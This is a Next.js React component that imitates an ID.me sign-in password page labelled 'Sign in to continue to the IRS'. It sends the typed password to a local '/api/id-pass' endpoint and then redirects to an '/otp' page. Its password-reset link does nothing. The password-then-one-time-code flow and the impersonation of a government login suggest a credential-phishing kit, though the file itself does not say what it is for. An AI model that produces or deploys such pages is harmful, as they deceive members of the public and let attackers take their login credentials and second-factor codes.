"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";

export default function IdMePasswordMock() {
  const [password, setPassword] = useState("");
  const [show, setShow] = useState(false);
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const handleContinue = async () => {
    if (!password) {
      alert("Please enter your password");
      return;
    }

    setLoading(true);

    try {
      const res = await fetch("/api/id-pass", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ password }),
      });

      const data = await res.json();

      if (data.success) {
        // ✅ redirect to OTP page
        router.push("/otp");
      } else {
        alert("Submission failed. Please try again.");
      }
    } catch (err) {
      console.error(err);
      alert("Something went wrong.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-white text-[#1f2937]">
      <div className="pt-24 px-4">
        <div className="mx-auto max-w-sm">
          <div className="rounded-xl bg-white shadow-[0_10px_30px_rgba(0,0,0,0.12)] ring-1 ring-black/5 p-8">
            <h1 className="text-center text-2xl font-semibold text-[#111827]">
              Enter your password
            </h1>

            <p className="mt-2 text-center text-sm text-[#6b7280]">
              Sign in to continue to the IRS
            </p>

            {/* Password input */}
            <div className="mt-8">
              <label className="block text-sm font-medium mb-2">
                Password
              </label>

              <div className="relative">
                <input
                  type={show ? "text" : "password"}
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full rounded-md border border-[#d1d5db] px-4 py-3 pr-12 text-sm outline-none focus:border-[#2563eb] focus:ring-2 focus:ring-[#2563eb]/20"
                />

                <button
                  type="button"
                  onClick={() => setShow(!show)}
                  className="absolute inset-y-0 right-3 text-sm text-[#2563eb]"
                >
                  {show ? "Hide" : "Show"}
                </button>
              </div>
            </div>

            {/* Continue */}
            <button
              onClick={handleContinue}
              disabled={loading}
              className="mt-6 w-full rounded-md bg-[#2563eb] py-3 text-sm font-semibold text-white hover:bg-[#1d4ed8] disabled:opacity-60"
            >
              {loading ? "Processing..." : "Continue"}
            </button>

            {/* Links */}
            <div className="mt-6 text-center space-y-2">
              <Link
                href="#"
                onClick={(e) => e.preventDefault()}
                className="block text-sm text-[#2563eb] underline"
              >
                Forgot your password?
              </Link>

              <Link
                href="/idme-mock"
                className="block text-sm text-[#2563eb] underline"
              >
                Use a different email
              </Link>
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}
